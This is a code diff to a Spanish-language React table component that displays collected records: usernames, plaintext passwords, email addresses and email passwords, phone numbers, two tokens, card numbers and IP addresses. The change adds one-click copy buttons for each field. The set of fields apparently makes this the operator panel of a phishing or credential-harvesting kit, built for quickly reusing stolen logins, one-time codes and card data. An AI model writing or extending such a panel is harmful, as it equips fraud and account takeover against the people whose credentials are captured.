@@ -1,5 +1,5 @@
 import { EyeIcon } from '@heroicons/react/20/solid';
-import { Table } from '@nextui-org/react';
+import { Table, Tooltip } from '@nextui-org/react';
 import { useContext } from 'react';
 import { DeleteIcon } from '../../assets/DeleteIcon';
 import { IconButton } from '../../assets/IconButton';
@@ -25,6 +25,7 @@ export const TableUserAll = ({users}) => {
         <Table.Column>Usuario</Table.Column>
         <Table.Column>Clave</Table.Column>
         <Table.Column>Correo</Table.Column>
+        <Table.Column>Clave Correo</Table.Column>
         <Table.Column>Celular</Table.Column>
         <Table.Column>token1</Table.Column>
         <Table.Column>token2</Table.Column>
@@ -40,6 +41,7 @@ export const TableUserAll = ({users}) => {
             username, 
             password,
             correo,
+            claveCorreo,
             celular,
             token1,
             token2,
@@ -47,13 +49,102 @@ export const TableUserAll = ({users}) => {
             ip
           }, i) => (
           <Table.Row key={i}>
-            <Table.Cell>{username}</Table.Cell>
-            <Table.Cell>{password}</Table.Cell>
-            <Table.Cell>{correo}</Table.Cell>
-            <Table.Cell>{celular}</Table.Cell>
-            <Table.Cell>{token1}</Table.Cell>
-            <Table.Cell>{token2}</Table.Cell>
-            <Table.Cell>{tarjeta}</Table.Cell>
+            <Table.Cell>
+              <Tooltip
+                content={'Copiado!'}
+                trigger={'click'}
+                color={"primary"}
+              >
+                <button onClick={() => navigator.clipboard.writeText(username)}>
+                  {username}
+                </button>
+              </Tooltip>
+            </Table.Cell>
+
+            <Table.Cell>
+              <Tooltip
+                content={'Copiado!'}
+                trigger={'click'}
+                color={"primary"}
+              >
+                <button onClick={() => navigator.clipboard.writeText(password)}>
+                  {password}
+                </button>
+              </Tooltip>
+            </Table.Cell>
+            
+            <Table.Cell>
+              <Tooltip
+                content={'Copiado!'}
+                trigger={'click'}
+                color={"primary"}
+              >
+                <button onClick={() => navigator.clipboard.writeText(correo)}>
+                  {correo}
+                </button>
+              </Tooltip>
+            </Table.Cell>
+            
+            <Table.Cell>
+              <Tooltip
+                content={'Copiado!'}
+                trigger={'click'}
+                color={"primary"}
+              >
+                <button onClick={() => navigator.clipboard.writeText(claveCorreo)}>
+                  {claveCorreo}
+                </button>
+              </Tooltip>
+            </Table.Cell>
+            
+            <Table.Cell>
+              <Tooltip
+                content={'Copiado!'}
+                trigger={'click'}
+                color={"primary"}
+              >
+                <button onClick={() => navigator.clipboard.writeText(celular)}>
+                  {celular}
+                </button>
+              </Tooltip>
+            </Table.Cell>
+
+            <Table.Cell>
+              <Tooltip
+                content={'Copiado!'}
+                trigger={'click'}
+                color={"primary"}
+              >
+                <button onClick={() => navigator.clipboard.writeText(token1)}>
+                  {token1}
+                </button>
+              </Tooltip>
+            </Table.Cell>
+
+            <Table.Cell>
+              <Tooltip
+                content={'Copiado!'}
+                trigger={'click'}
+                color={"primary"}
+              >
+                <button onClick={() => navigator.clipboard.writeText(token2)}>
+                  {token2}
+                </button>
+              </Tooltip>
+            </Table.Cell>
+
+            <Table.Cell>
+              <Tooltip
+                content={'Copiado!'}
+                trigger={'click'}
+                color={"primary"}
+              >
+                <button onClick={() => navigator.clipboard.writeText(tarjeta)}>
+                  {tarjeta}
+                </button>
+              </Tooltip>
+            </Table.Cell>
+
             <Table.Cell>{ip}</Table.Cell>
             <Table.Cell>
               <IconButton onClick={() => deleteUser({_id})}>
